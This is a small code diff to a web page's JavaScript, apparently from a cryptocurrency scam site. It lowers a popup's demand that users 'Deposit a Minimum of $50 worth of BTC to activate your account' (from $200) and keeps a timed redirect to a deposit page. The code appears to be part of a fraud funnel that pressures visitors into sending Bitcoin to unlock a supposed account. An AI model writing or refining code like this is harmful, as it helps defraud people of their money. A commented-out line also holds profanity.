@@ -8,7 +8,7 @@
     var error = document.getElementById('error');
     if (error.textContent == "" ) {
       //  alert('fuck')
-        swal("Oops!", "Hello, Kindly Deposit a Minimum of $200 worth of BTC to activate your account", "warning");  
+        swal("Oops!", "Hello, Kindly Deposit a Minimum of $50 worth of BTC to activate your account", "warning");  
         setTimeout(() => {
             window.location.href = 'deposit'
         }, 30000);     
